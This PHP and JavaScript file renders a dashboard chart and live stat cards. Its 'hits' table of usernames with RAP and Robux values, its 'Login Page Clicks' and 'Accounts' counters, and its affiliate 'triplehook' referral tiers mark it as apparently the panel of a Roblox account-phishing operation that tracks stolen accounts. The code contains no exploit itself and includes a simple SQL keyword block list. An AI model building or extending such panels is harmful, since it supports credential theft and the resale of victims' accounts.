<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

if (empty($userData) || !is_array($userData) || (int)($userData['link_id'] ?? 0) <= 0) {
    $userData = function_exists('ultimaAuthenticatedRegular') ? ultimaAuthenticatedRegular() : null;
}
if (!is_array($userData)) {
    http_response_code(401);
    exit;
}
if (!function_exists('dashWidgetQuery')) {
    function dashWidgetQuery($sql, $params = [], $ttl = 60) {
        if (function_exists('ultimaPageQuery')) {
            return ultimaPageQuery($sql, $params, $ttl);
        }
        if (function_exists('executeSafeQuery')) {
            return executeSafeQuery($sql, $params);
        }
        return [];
    }
}


$link_id = (int)$userData['link_id'];
$linkId = $link_id;
$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;
$summaryLabel = $isTriplehook ? "Triplehook SUMMARY" : "Summary";
$rapLabel = $isTriplehook ? "Triplehook RAP" : "RAP";
$balanceLabel = $isTriplehook ? "Triplehook BALANCE" : "Balance";
if($isTriplehook){
    date_default_timezone_set('UTC');
    
    $weekStart = date('Y-m-d 00:00:00', strtotime('monday this week'));
    $weekEnd = date('Y-m-d 23:59:59', strtotime('sunday this week'));
    $chartQuery = "SELECT h.username, h.summary, h.rap, h.robux, h.created_at FROM hits h 
                   WHERE h.created_at >= :week_start AND h.created_at <= :week_end
                   AND h.link_id IN (SELECT link_id FROM regular WHERE referred_by = :link_id UNION SELECT r2.link_id FROM regular r2 WHERE r2.referred_by IN (SELECT td.link_id FROM triplehook_data td INNER JOIN regular r ON r.link_id = td.link_id WHERE r.referred_by = :link_id2))";
    $chartResult = dashWidgetQuery($chartQuery, [':link_id' => $link_id, ':link_id2' => $link_id, ':week_start' => $weekStart, ':week_end' => $weekEnd]);
    
    $summaryData = [0, 0, 0, 0, 0, 0, 0];
    $rapData = [0, 0, 0, 0, 0, 0, 0];
    $balanceData = [0, 0, 0, 0, 0, 0, 0];
    
    $now = time();
    $currentDayOfWeek = (int)date('N', $now);
    $daysFromMonday = $currentDayOfWeek - 1;
    $todayMidnight = strtotime('today 00:00:00', $now);
    $mondayMidnight = $todayMidnight - ($daysFromMonday * 86400);
    $sundayEnd = $mondayMidnight + (7 * 86400);
    
    $seenUsersChart = [];
    if (!empty($chartResult)) {
        foreach ($chartResult as $row) {
            $rowTimestamp = strtotime($row['created_at']);
            
            if($rowTimestamp >= $mondayMidnight && $rowTimestamp < $sundayEnd) {
                $dayKey = date('Y-m-d', $rowTimestamp);
                $uKey = ($row['username'] ?? '') . '|' . $dayKey;
                if(isset($seenUsersChart[$uKey])) continue;
                $seenUsersChart[$uKey] = true;
                
                $dayOfWeek = (int)date('N', $rowTimestamp);
                $dayIndex = $dayOfWeek - 1;
                
                $summaryData[$dayIndex] += intval($row['summary'] ?? 0);
                $rapData[$dayIndex] += intval($row['rap'] ?? 0);
                $balanceData[$dayIndex] += intval($row['robux'] ?? 0);
            }
        }
    }
} else {
    date_default_timezone_set('UTC');
    $weekStart = date('Y-m-d 00:00:00', strtotime('monday this week'));
    $weekEnd = date('Y-m-d 23:59:59', strtotime('sunday this week'));
    $chartQuery = "SELECT h.username, h.summary, h.rap, h.robux, h.created_at, h.link_id
                   FROM hits h
                   WHERE h.link_id = :link_id
                   AND h.created_at >= :week_start AND h.created_at <= :week_end";
    $chartResult = dashWidgetQuery($chartQuery, [':link_id' => $link_id, ':week_start' => $weekStart, ':week_end' => $weekEnd]);
    $summaryData = [0, 0, 0, 0, 0, 0, 0];
    $rapData = [0, 0, 0, 0, 0, 0, 0];
    $balanceData = [0, 0, 0, 0, 0, 0, 0];
    $seenUsersChart = [];
    if (!empty($chartResult)) {
        foreach ($chartResult as $row) {
            $rowTimestamp = strtotime($row['created_at']);
            $dayKey = date('Y-m-d', $rowTimestamp);
            $uKey = ($row['username'] ?? '') . '|' . $dayKey;
            if (isset($seenUsersChart[$uKey])) continue;
            $seenUsersChart[$uKey] = true;
            $dayIndex = ((int)date('N', $rowTimestamp)) - 1;
            if ($dayIndex < 0 || $dayIndex > 6) continue;
            $summaryData[$dayIndex] += intval($row['summary'] ?? 0);
            $rapData[$dayIndex] += intval($row['rap'] ?? 0);
            $balanceData[$dayIndex] += intval($row['robux'] ?? 0);
        }
    }
}
?>
<style>
.overview-card{position:relative;width:100%;background:transparent;border:1px solid rgba(255,255,255,0.07);border-radius:18px;padding:28px;box-shadow:none;display:flex;flex-direction:column}
.overview-card:hover{border-color:rgba(255,255,255,0.13);box-shadow:none}
.overview-card h2,.overview-card h3{text-shadow:none;color:#fff}
.chart-header{display:flex;justify-content:flex-end;gap:8px;margin-bottom:14px;flex-shrink:0}
.stat-label-btn{display:flex;align-items:center;padding:5px 12px;background:transparent;border:1px solid rgba(255,255,255,0.06);cursor:pointer;border-radius:20px;transition:border-color 0.3s ease, opacity 0.3s ease;position:relative;overflow:hidden}
.stat-label-btn:hover{border-color:rgba(255,255,255,0.18)}
.stat-label-btn.active{border-color:var(--stat-color)!important;box-shadow:none;opacity:1!important}
.stat-label-btn[data-stat="summary"]{--stat-color:rgba(168,85,247,0.35);--stat-glow:transparent}
.stat-label-btn[data-stat="rap"]{--stat-color:rgba(0,191,255,0.35);--stat-glow:transparent}
.stat-label-btn[data-stat="balance"]{--stat-color:rgba(212,168,67,0.45);--stat-glow:transparent}
.stat-text{font-family:'Rajdhani',sans-serif;font-size:0.68rem;font-weight:600;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:2px}
.stat-label-btn.active .stat-text{color:rgba(255,255,255,0.75)!important}
.stat-label-btn:not(.active){opacity:0.5!important}
.stat-label-btn:not(.active):hover{opacity:0.75!important}
.chart-container{flex:1;min-height:250px;position:relative;background:transparent}
@media(max-width:768px){.overview-card{padding:20px;border-radius:14px}.chart-container{min-height:200px}.chart-header{gap:6px;margin-bottom:12px}.stat-label-btn{padding:4px 10px}.stat-text{font-size:0.62rem;letter-spacing:1.5px}}
@media(max-width:480px){.overview-card{padding:16px;border-radius:12px}.chart-container{min-height:160px}.chart-header{justify-content:center;flex-wrap:wrap;gap:6px}.stat-label-btn{padding:4px 8px}.stat-text{font-size:0.58rem;letter-spacing:1px}}
#oc-tooltip{position:fixed;pointer-events:none;background:transparent;backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px);border:none;border-radius:0;padding:12px 18px;font-family:'Rajdhani',sans-serif;opacity:0;transform:translateY(4px);transition:opacity 0.2s ease-out,transform 0.2s ease-out;z-index:99999;box-shadow:none;min-width:140px}
#oc-tooltip.oc-tt-visible{opacity:1;transform:translateY(0);transition:opacity 0.25s cubic-bezier(0.16,1,0.3,1),transform 0.25s cubic-bezier(0.16,1,0.3,1)}
#oc-tooltip .oc-tt-title{font-family:'Rajdhani',sans-serif;font-size:0.62rem;font-weight:600;color:rgba(255,255,255,0.55);margin-bottom:8px;padding-bottom:0;border-bottom:none;letter-spacing:3px;text-transform:uppercase}
#oc-tooltip .oc-tt-row{display:flex;align-items:center;gap:10px;margin:4px 0;opacity:0;animation:ocRowFadeIn 0.25s ease-out forwards}
#oc-tooltip .oc-tt-row:nth-child(2){animation-delay:0.04s}
#oc-tooltip .oc-tt-row:nth-child(3){animation-delay:0.08s}
#oc-tooltip .oc-tt-row:nth-child(4){animation-delay:0.12s}
#oc-tooltip .oc-tt-dot{width:5px;height:5px;border-radius:50%;flex-shrink:0;box-shadow:none;opacity:.7}
#oc-tooltip .oc-tt-icon{width:12px;height:12px;object-fit:contain;flex-shrink:0;opacity:.7}
#oc-tooltip .oc-tt-label{font-size:0.7rem;color:rgba(255,255,255,0.4);white-space:nowrap;letter-spacing:.3px}
#oc-tooltip .oc-tt-val{font-size:0.78rem;font-weight:600;color:rgba(255,255,255,0.9);margin-left:auto;letter-spacing:.5px;padding-left:14px}
@keyframes ocRowFadeIn{0%{opacity:0;transform:translateX(-6px)}100%{opacity:1;transform:translateX(0)}}
</style>
<div class="card overview-card" id="overview-card">
    <div class="chart-container"><canvas id="overviewChart"></canvas></div>
</div>
<div id="oc-tooltip"></div>
<script>
var OverviewChart=(function(){
var chart=null;
var ttX=0,ttY=0,ttTargetX=0,ttTargetY=0,ttVisible=false,ttRaf=null;
var robuxSrc="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' width='32' height='32'%3E%3Cpath d='M15.0762 7.29574C15.6479 6.96571 16.3521 6.96571 16.9238 7.29574L23.0762 10.8479C23.6479 11.1779 24 11.7878 24 12.4479V19.5521C24 20.2122 23.6479 20.8221 23.0762 21.1521L16.9238 24.7043C16.3521 25.0343 15.6479 25.0343 15.0762 24.7043L8.92376 21.1521C8.35214 20.8221 8 20.2122 8 19.5521V12.4479C8 11.7878 8.35214 11.1779 8.92376 10.8479L15.0762 7.29574ZM11.9998 13V19C11.9998 19.5523 12.4475 20 12.9998 20H18.9998C19.5521 20 19.9998 19.5523 19.9998 19V13C19.9998 12.4477 19.5521 12 18.9998 12H12.9998C12.4475 12 11.9998 12.4477 11.9998 13Z' fill='%23d4a843'/%3E%3Cpath d='M13.8556 2.56068C15.1825 1.81311 16.8175 1.81311 18.1444 2.56068L26.8556 7.46819C28.1825 8.21577 29 9.59734 29 11.0925V20.9075C29 22.4027 28.1825 23.7842 26.8556 24.5318L18.1444 29.4393C16.8175 30.1869 15.1825 30.1869 13.8556 29.4393L5.14444 24.5318C3.81746 23.7842 3 22.4027 3 20.9075V11.0925C3 9.59734 3.81746 8.21577 5.14444 7.46819L13.8556 2.56068ZM17.1628 4.30319C16.4452 3.89894 15.5548 3.89894 14.8372 4.30319L6.12611 9.2107C5.41362 9.61209 5 10.336 5 11.0925V20.9075C5 21.664 5.41362 22.3879 6.12611 22.7893L14.8372 27.6968C15.5548 28.1011 16.4452 28.1011 17.1628 27.6968L25.8739 22.7893C26.5864 22.3879 27 21.664 27 20.9075V11.0925C27 10.336 26.5864 9.61209 25.8739 9.2107L17.1628 4.30319Z' fill='%23d4a843'/%3E%3C/svg%3E";
var data={summary:<?php echo json_encode($summaryData); ?>,rap:<?php echo json_encode($rapData); ?>,balance:<?php echo json_encode($balanceData); ?>};
var colors={summary:{border:'#A855F7',bg:'rgba(168,85,247,0.15)'},rap:{border:'#00BFFF',bg:'rgba(0,191,255,0.15)'},balance:{border:'#d4a843',bg:'rgba(212,168,67,0.15)'}};
function lerpTooltip(){
  var tt=document.getElementById('oc-tooltip');
  if(!tt||!ttVisible){ttRaf=null;return;}
  ttX+=(ttTargetX-ttX)*0.18;
  ttY+=(ttTargetY-ttY)*0.18;
  tt.style.left=Math.round(ttX)+'px';
  tt.style.top=Math.round(ttY)+'px';
  ttRaf=requestAnimationFrame(lerpTooltip);
}
function startLerp(){if(!ttRaf)ttRaf=requestAnimationFrame(lerpTooltip)}
function stopLerp(){if(ttRaf){cancelAnimationFrame(ttRaf);ttRaf=null}}
function hideTooltip(){
  var tt=document.getElementById('oc-tooltip');
  if(tt)tt.classList.remove('oc-tt-visible');
  ttVisible=false;
  stopLerp();
}
function hexToRgba(hex,a){
  var r=parseInt(hex.slice(1,3),16),g=parseInt(hex.slice(3,5),16),b=parseInt(hex.slice(5,7),16);
  return 'rgba('+r+','+g+','+b+','+a+')';
}
function revealAnimate(el){
  var dur=2400;
  var start=Date.now();
  el.style.clipPath='inset(0 100% 0 0)';
  function tick(){
    var t=Math.min((Date.now()-start)/dur,1);
    t=t<0.5?4*t*t*t:1-Math.pow(-2*t+2,3)/2;
    var pct=(100-t*100).toFixed(2);
    el.style.clipPath='inset(0 '+pct+'% 0 0)';
    if(t<1)requestAnimationFrame(tick);
    else el.style.clipPath='none';
  }
  requestAnimationFrame(tick);
}
var hoverPlugin={
  id:'hoverBump',
  afterDatasetsDraw:function(ch){
    if(!ch._active||!ch._active.length)return;
    var ctx=ch.ctx;
    var x=ch._active[0].element.x;
    var topY=ch.scales.y.top;
    var bottomY=ch.scales.y.bottom;
    ctx.save();
    ctx.beginPath();
    ctx.moveTo(x,topY);
    ctx.lineTo(x,bottomY);
    ctx.lineWidth=1;
    ctx.strokeStyle='rgba(255,255,255,0.06)';
    ctx.setLineDash([4,4]);
    ctx.stroke();
    ctx.restore();
    var tt=ch.tooltip;
    if(!tt||!tt.dataPoints)return;
    tt.dataPoints.forEach(function(dp){
      var meta=ch.getDatasetMeta(dp.datasetIndex);
      var pts=meta.data;
      var idx=dp.index;
      var pt=pts[idx];
      if(!pt)return;
      var px=pt.x,py=pt.y;
      var lineColor=meta.dataset.options.borderColor||'#fff';
      var lw=meta.dataset.options.borderWidth||2.5;
      var prev=pts[idx-1];
      var next=pts[idx+1];
      var x0=prev?prev.x:px-30;
      var y0=prev?prev.y:py;
      var x1=next?next.x:px+30;
      var y1=next?next.y:py;
      var spread=18;
      var bumpH=6;
      var lx=Math.max(px-spread,x0+(px-x0)*0.5);
      var rx=Math.min(px+spread,px+(x1-px)*0.5);
      var lyAtLx=y0+(py-y0)*((lx-x0)/(px-x0||1));
      var ryAtRx=py+(y1-py)*((rx-px)/(x1-px||1));
      ctx.save();
      ctx.beginPath();
      ctx.moveTo(lx,lyAtLx);
      ctx.quadraticCurveTo(px,py-bumpH,rx,ryAtRx);
      ctx.lineWidth=lw+3;
      ctx.strokeStyle=hexToRgba(lineColor,0.15);
      ctx.lineCap='round';
      ctx.stroke();
      ctx.beginPath();
      ctx.moveTo(lx,lyAtLx);
      ctx.quadraticCurveTo(px,py-bumpH,rx,ryAtRx);
      ctx.lineWidth=lw+1;
      ctx.strokeStyle=lineColor;
      ctx.lineCap='round';
      ctx.stroke();
      var glow=ctx.createRadialGradient(px,py-bumpH*0.3,0,px,py-bumpH*0.3,12);
      glow.addColorStop(0,hexToRgba(lineColor,0.35));
      glow.addColorStop(1,'rgba(0,0,0,0)');
      ctx.fillStyle=glow;
      ctx.beginPath();
      ctx.arc(px,py-bumpH*0.3,12,0,Math.PI*2);
      ctx.fill();
      ctx.restore();
    });
  }
};
function createGradient(ctx,c){
  var h=ctx.canvas.clientHeight||ctx.canvas.height||250;
  if(h<10)h=250;
  var g=ctx.createLinearGradient(0,0,0,h);
  g.addColorStop(0,c.bg.replace(/[\d.]+\)$/,'0.35)'));
  g.addColorStop(0.6,c.bg.replace(/[\d.]+\)$/,'0.08)'));
  g.addColorStop(1,'rgba(0,0,0,0)');
  return g;
}
function create(){
  var canvas=document.getElementById('overviewChart');
  if(!canvas)return;
  canvas.style.clipPath='inset(0 100% 0 0)';
  var ctx=canvas.getContext('2d');
  if(chart)chart.destroy();
  var datasets=[];
  var stats=['summary','rap','balance'];
  var isMobile=window.innerWidth<=480;
  stats.forEach(function(s){
    var offsetData=data[s].map(function(v){return v});
    var base={data:offsetData,borderColor:colors[s].border,backgroundColor:createGradient(ctx,colors[s]),stepped:false,fill:true,tension:0.4,pointRadius:0,pointHoverRadius:0,pointHitRadius:30,pointBorderWidth:0};
    if(s==='summary'){
      base.label='Summary';base.borderWidth=isMobile?2:2.5;base.order=1;
    }else if(s==='rap'){
      base.label='RAP';base.borderWidth=isMobile?2:2.5;base.borderDash=[10,4];base.order=0;
    }else{
      base.label='Balance';base.borderWidth=isMobile?2:3;base.order=2;
    }
    datasets.push(base);
  });
  var animationConfig={duration:0};
  chart=new Chart(ctx,{
    type:'line',
    data:{labels:['MON','TUE','WED','THU','FRI','SAT','SUN'],datasets:datasets},
    plugins:[hoverPlugin],
    options:{
      responsive:true,
      maintainAspectRatio:false,
      resizeDelay:0,
      layout:{padding:{top:8,right:10,bottom:0,left:0}},
      plugins:{legend:{display:false},tooltip:{
        enabled:false,
        external:function(context){
          var tt=document.getElementById('oc-tooltip');
          if(!tt)return;
          var tc=context.tooltip;
          if(tc.opacity===0){hideTooltip();return;}
          var dotColors={Summary:'#A855F7',RAP:'#00BFFF',Balance:'#d4a843'};
          var icons={Summary:'/images/summary.gif',RAP:'/images/rap.png',Balance:robuxSrc};
          var html='<div class="oc-tt-title">'+tc.title[0]+'</div>';
          tc.body.forEach(function(b,i){
            var ds=tc.dataPoints[i];
            var lbl=ds.dataset.label||'';
            var val=Math.round(ds.parsed.y).toString().replace(/\B(?=(\d{3})+(?!\d))/g,' ');
            var ic=icons[lbl]||'';
            var dc=dotColors[lbl]||'#fff';
            html+='<div class="oc-tt-row">';
            if(ic){html+='<img class="oc-tt-icon" src="'+ic+'" alt="">';}
            else{html+='<div class="oc-tt-dot" style="--dot-color:'+dc+';background:'+dc+'"></div>';}
            html+='<span class="oc-tt-label">'+lbl+'</span><span class="oc-tt-val">'+val+'</span></div>';
          });
          tt.innerHTML=html;
          var pos=context.chart.canvas.getBoundingClientRect();
          var tw=tt.offsetWidth||150;
          var th=tt.offsetHeight||90;
          var nx=pos.left+tc.caretX-(tw/2);
          var ny=pos.top+tc.caretY-th-16;
          if(nx<8)nx=8;
          if(nx+tw>window.innerWidth-8)nx=window.innerWidth-tw-8;
          if(ny<8)ny=pos.top+tc.caretY+16;
          ttTargetX=nx;ttTargetY=ny;
          if(!ttVisible){
            ttX=nx;ttY=ny+6;ttVisible=true;
            tt.style.left=Math.round(ttX)+'px';
            tt.style.top=Math.round(ttY)+'px';
            requestAnimationFrame(function(){tt.classList.add('oc-tt-visible');});
            startLerp();
          }
        }
      }},
      scales:{
        y:{beginAtZero:true,grid:{color:'rgba(255,255,255,0.025)',drawBorder:false},ticks:{color:'rgba(255,255,255,0.3)',font:{family:'Rajdhani',size:isMobile?9:11}},border:{display:false}},
        x:{grid:{display:false},ticks:{color:'rgba(255,255,255,0.3)',font:{family:'Rajdhani',size:isMobile?9:11}},border:{display:false}}
      },
      interaction:{intersect:false,mode:'index'},
      hover:{animationDuration:150},
      transitions:{resize:{animation:{duration:0}},active:{animation:{duration:150}}},
      animation:animationConfig
    }
  });
  setTimeout(function(){revealAnimate(canvas);},50);
}
function init(){
  create();
  window.addEventListener('sidebarResizeComplete',function(){if(chart)chart.resize()});
  var canvas=document.getElementById('overviewChart');
  if(canvas)canvas.addEventListener('mouseleave',function(){hideTooltip()});
}
function resize(){if(chart)chart.resize()}
function updateData(next,animate){
  ['summary','rap','balance'].forEach(function(key){
    if(next&&Array.isArray(next[key]))data[key]=next[key].map(function(value){return parseInt(value)||0});
  });
  if(!chart)return;
  ['summary','rap','balance'].forEach(function(key,index){
    if(chart.data.datasets[index])chart.data.datasets[index].data=data[key];
  });
  chart.options.animation=animate?{duration:420,easing:'easeOutCubic'}:animationConfig;
  if(animate)chart.update();else chart.update('none');
  chart.options.animation=animationConfig;
}
var scrollParent=document.querySelector('.main-content')||document.querySelector('.dashboard-content')||window;
scrollParent.addEventListener('scroll',function(){hideTooltip()});
window.addEventListener('scroll',function(){hideTooltip()});
return{init:init,create:create,resize:resize,updateData:updateData};
})();
</script>
<script>
(function(){
    if(window.__dashboardStatsSocketStarted)return;
    window.__dashboardStatsSocketStarted=true;

    function formatNumber(value){return (parseInt(value)||0).toString().replace(/\B(?=(\d{3})+(?!\d))/g,' ')}
    window.dashboardAnimateNumber=function(element,target,suffix,animate){
        if(!element)return;
        target=parseInt(target)||0;suffix=suffix||'';
        if(!animate){element.dataset.liveValue=String(target);return;}
        var from=parseInt(element.dataset.liveValue);
        if(isNaN(from))from=parseInt(element.getAttribute('data-target'))||target;
        element.dataset.liveValue=String(target);
        if(from===target){element.textContent=formatNumber(target)+suffix;return;}
        if(element.__dashboardNumberRaf)cancelAnimationFrame(element.__dashboardNumberRaf);
        var started=performance.now(),duration=420;
        function frame(now){
            var progress=Math.min((now-started)/duration,1),ease=1-Math.pow(1-progress,3);
            element.textContent=formatNumber(Math.round(from+(target-from)*ease))+suffix;
            if(progress<1)element.__dashboardNumberRaf=requestAnimationFrame(frame);
            else element.__dashboardNumberRaf=null;
        }
        element.__dashboardNumberRaf=requestAnimationFrame(frame);
    };

    function updateStatCard(cardId,metric,chartId,labelId,pctId,tooltipLabel,animate){
        var card=document.getElementById(cardId);
        if(!card||!metric)return;
        var total=parseInt(metric.total)||0;
        var value=card.querySelector('.stat-value');
        if(value){value.setAttribute('data-target',total);window.dashboardAnimateNumber(value,total,'',animate);}
        var today=card.querySelector('.stat-today');
        if(today)today.innerHTML='+'+formatNumber(metric.today)+' <span>today</span>';
        var attrs={
            'data-hourly':metric.hourly,
            'data-hourly-labels':metric.hourly_labels,
            'data-weekly':metric.weekly,
            'data-weekly-labels':metric.weekly_labels,
            'data-monthly':metric.monthly,
            'data-monthly-labels':metric.monthly_labels
        };
        Object.keys(attrs).forEach(function(name){if(Array.isArray(attrs[name]))card.setAttribute(name,JSON.stringify(attrs[name]));});
        if(typeof window.buildMiniChart==='function')window.buildMiniChart(chartId,labelId,pctId,metric.weekly||[],metric.weekly_labels||[],tooltipLabel);
    }

    var hasLiveSnapshot=false;
    function applyPayload(payload){
        if(!payload)return;
        // dashboard:stats CustomEvent'ini paylaşımlı istemci (header.php) yayıyor;
        // burada tekrar yaymıyoruz.
        var animate=hasLiveSnapshot;hasLiveSnapshot=true;
        updateStatCard('clicks-stat-card',payload.clicks,'clicksMiniChart','clicksMiniLabels','clicksMiniPct','Login Page Clicks',animate);
        updateStatCard('visits-stat-card',payload.visits,'visitsMiniChart','visitsMiniLabels','visitsMiniPct','Visits',animate);
        updateStatCard('accounts-stat-card',payload.accounts,'accMiniChart','accMiniLabels','accMiniPct','Accounts',animate);
        if(payload.summary&&typeof window.updateSummaryLive==='function')window.updateSummaryLive(payload.summary,animate);
        if(window.OverviewChart&&typeof window.OverviewChart.updateData==='function'&&payload.overview&&payload.overview.weekly){window.OverviewChart.updateData(payload.overview.weekly,animate);}
    }

    // Paylaşımlı WS istemcisi (window.ultimaWS) header.php içinde tanımlanıyor.
    // Bu sayfa /wsx üzerinden 'dashboard' kanalına abone oluyor.
    function subscribe(){
        if(!window.ultimaWS||typeof window.ultimaWS.subscribe!=='function'){
            setTimeout(subscribe,50);return;
        }
        window.ultimaWS.subscribe('dashboard',function(message){
            if(!message||typeof message!=='object')return;
            if(message.type==='dashboard_stats')applyPayload(message.payload);
        });
    }
    if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',subscribe);else subscribe();
})();
</script>
